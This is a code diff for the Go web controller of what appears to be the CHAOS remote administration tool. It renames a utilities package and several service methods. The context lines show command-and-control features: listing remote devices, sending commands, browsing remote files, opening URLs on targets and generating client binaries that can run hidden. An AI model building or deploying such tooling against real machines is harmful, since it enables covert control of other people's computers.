@@ -11,10 +11,10 @@ import (
 	"github.com/tiagorlampert/CHAOS/middleware"
 	"github.com/tiagorlampert/CHAOS/services"
 	"github.com/tiagorlampert/CHAOS/shared/environment"
-	"github.com/tiagorlampert/CHAOS/shared/utils"
-	"github.com/tiagorlampert/CHAOS/shared/utils/constants"
-	"github.com/tiagorlampert/CHAOS/shared/utils/network"
-	"github.com/tiagorlampert/CHAOS/shared/utils/system"
+	"github.com/tiagorlampert/CHAOS/shared/utilities"
+	"github.com/tiagorlampert/CHAOS/shared/utilities/constants"
+	"github.com/tiagorlampert/CHAOS/shared/utilities/network"
+	"github.com/tiagorlampert/CHAOS/shared/utilities/system"
 	"net/http"
 	"path/filepath"
 	"strconv"
@@ -157,7 +157,7 @@ func (h *httpController) createUserHandler(c *gin.Context) {
 		return
 	}
 
-	if err := h.UserService.Create(body); err != nil {
+	if err := h.UserService.Insert(body); err != nil {
 		if err == services.ErrUserAlreadyExist {
 			c.Status(http.StatusNotModified)
 			return
@@ -223,7 +223,7 @@ func (h *httpController) setDeviceHandler(c *gin.Context) {
 }
 
 func (h *httpController) getDevicesHandler(c *gin.Context) {
-	clients, err := h.DeviceService.GetAllAvailable()
+	devices, err := h.DeviceService.FindAll()
 	if err != nil {
 		h.Logger.Error(`Failed to get available devices`)
 		c.Status(http.StatusInternalServerError)
@@ -231,7 +231,7 @@ func (h *httpController) getDevicesHandler(c *gin.Context) {
 	}
 
 	c.HTML(http.StatusOK, "devices.html", gin.H{
-		"Devices": clients,
+		"Devices": devices,
 	})
 	return
 }
@@ -264,7 +264,7 @@ func (h *httpController) sendCommandHandler(c *gin.Context) {
 
 func (h *httpController) getCommandHandler(c *gin.Context) {
 	address := c.Query("address")
-	decoded, err := utils.DecodeBase64(address)
+	decoded, err := utilities.DecodeBase64(address)
 	if err != nil {
 		c.String(http.StatusBadRequest, err.Error())
 		return
@@ -318,7 +318,7 @@ func (h *httpController) generateBinaryPostHandler(c *gin.Context) {
 		ServerPort:    req.Port,
 		OSTarget:      system.OSTargetIntMap[osTarget],
 		Filename:      req.Filename,
-		RunHidden:     utils.ParseCheckboxBoolean(req.RunHidden),
+		RunHidden:     utilities.ParseCheckboxBoolean(req.RunHidden),
 	})
 	if err != nil {
 		c.String(http.StatusInternalServerError, err.Error())
@@ -352,7 +352,7 @@ func (h *httpController) fileExplorerHandler(c *gin.Context) {
 		c.String(http.StatusBadRequest, err.Error())
 		return
 	}
-	path, err := utils.DecodeBase64(req.Path)
+	path, err := utilities.DecodeBase64(req.Path)
 	if err != nil {
 		c.String(http.StatusBadRequest, err.Error())
 		return
@@ -371,7 +371,7 @@ func (h *httpController) fileExplorerHandler(c *gin.Context) {
 	}
 
 	var fileExplorer entities.FileExplorer
-	err = json.Unmarshal(utils.StringToByte(payload.Response), &fileExplorer)
+	err = json.Unmarshal(utilities.StringToByte(payload.Response), &fileExplorer)
 	if err != nil {
 		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
 		return
@@ -401,7 +401,7 @@ func (h *httpController) openUrlHandler(c *gin.Context) {
 		c.String(http.StatusBadRequest, err.Error())
 		return
 	}
-	if err := h.UrlService.OpenURL(c.Request.Context(), req.Address, req.URL); err != nil {
+	if err := h.UrlService.OpenUrl(c.Request.Context(), req.Address, req.URL); err != nil {
 		c.String(http.StatusInternalServerError, err.Error())
 		return
 	}
